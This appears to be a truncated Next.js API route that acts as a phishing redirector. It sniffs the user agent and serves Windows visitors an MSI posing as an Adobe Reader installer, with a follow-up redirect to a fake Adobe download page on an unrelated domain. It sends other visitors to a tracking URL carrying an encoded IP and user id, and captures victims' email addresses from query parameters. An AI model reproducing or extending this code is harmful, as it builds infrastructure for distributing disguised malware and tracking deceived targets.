// pages/api/redirect.js

export default function handler(req, res) {
  const userAgent = req.headers["user-agent"] || "";
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
    "https://mksonline.com.mx/css/adobe/reader/download.html";
  const MSI_PATH = "/Reader_adobe_install_online.msi";

  // Base redirect for non-Windows
  const NON_WINDOWS_TARGET =
    "https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=";

  //--------------------------------------------------------------------
  // 1. Try reading email from query (?email= or ?smn=)
  //--------------------------------------------------------------------
  let email = "";

  if (req.query.email) {
    email = Array.isArray(req.query.email)
      ? req.query.email[0]
      : req.query.email;
  } else if (req.query.smn) {
    email = Array.isArray(req.query.smn)
      ? req.query.smn[0]
      :
